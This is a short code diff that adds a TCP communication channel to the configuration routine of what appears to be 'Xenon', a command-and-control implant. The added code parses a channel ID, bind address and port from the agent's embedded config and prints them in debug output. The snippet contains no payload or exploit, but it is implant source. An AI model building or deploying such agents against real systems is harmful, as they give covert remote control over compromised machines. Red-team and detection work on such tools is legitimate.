@@ -32,6 +32,7 @@ VOID XenonConfigure()
     SIZE_T userLen      = 0;
     SIZE_T passLen      = 0;
     SIZE_T namedPipeLen = 0;
+    SIZE_T tcpAddressLen = 0;
 
     ParserNew(&ParserConfig, (PBYTE)AgentConfig, sizeof(AgentConfig));
     RtlSecureZeroMemory(AgentConfig, sizeof(AgentConfig));
@@ -122,6 +123,17 @@ VOID XenonConfigure()
 
 #endif
 
+#ifdef TCP_TRANSPORT
+
+    // TCP Comms Channel
+    xenonConfig->TcpId             = ParserGetInt32(&ParserConfig);
+    xenonConfig->TcpSocketServer   = NULL;
+    xenonConfig->TcpSocketClient   = NULL;
+    xenonConfig->TcpBindAddress    = ParserStringCopy(&ParserConfig, &tcpAddressLen);                     // allocates
+    xenonConfig->TcpPort           = ParserGetInt32(&ParserConfig);
+
+#endif
+
     // DEBUG Print Values
     _dbg("AGENT CONFIGURATION VALUES: \n");
 
@@ -146,6 +158,14 @@ VOID XenonConfigure()
 
     _dbg("[SmbId]          = [%x]", xenonConfig->SmbId);
     _dbg("[SmbPipename]    = %s", xenonConfig->SmbPipename);
+    
+#endif
+
+#ifdef TCP_TRANSPORT
+
+    _dbg("[TcpId]           = [%x]", xenonConfig->TcpId);
+    _dbg("[TcpBindAddress]  = %s", xenonConfig->TcpBindAddress);
+    _dbg("[TcpPort]         = %d", xenonConfig->TcpPort);
     
 #endif
 
